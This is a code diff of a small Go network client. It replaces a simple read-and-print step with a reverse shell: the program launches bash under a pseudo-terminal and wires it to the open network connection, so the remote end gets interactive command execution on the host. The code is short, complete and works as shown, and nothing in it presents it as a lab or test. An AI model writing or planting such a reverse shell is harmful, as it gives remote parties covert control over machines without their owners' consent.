@@ -2,12 +2,15 @@ package main
 
 import (
 	"fmt"
+	"io"
 	"net"
 	"os"
+	"os/exec"
+
+	"github.com/creack/pty"
 )
 
 func main() {
-	buffer := make([]byte, 1024)
 
 	fmt.Println("Initializing client...")
 
@@ -20,9 +23,12 @@ func main() {
 
 	fmt.Println("Connected")
 
-	fmt.Printf("%T\n", conn)
+	cmd := exec.Command("bash")
+	ptmx, _ := pty.Start(cmd)
 
-	conn.Read(buffer)
+	go func() { io.Copy(ptmx, conn) }()
+	io.Copy(conn, ptmx)
 
-	fmt.Println("Executing...", string(buffer))
+	ptmx.Close()
+	conn.Close()
 }
